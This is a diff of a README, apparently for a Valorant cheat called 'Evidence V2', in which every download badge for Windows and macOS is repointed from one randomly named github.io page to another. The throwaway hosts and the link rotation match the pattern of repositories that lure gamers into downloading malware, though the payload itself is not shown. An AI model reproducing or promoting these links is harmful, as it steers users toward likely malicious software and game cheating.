@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Valorant-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Valorant-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
@@ -56,9 +56,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://tlwbljvlzhgm.github.io/windows-install/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 </div>
 
@@ -75,7 +75,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Valorant-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Valorant-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
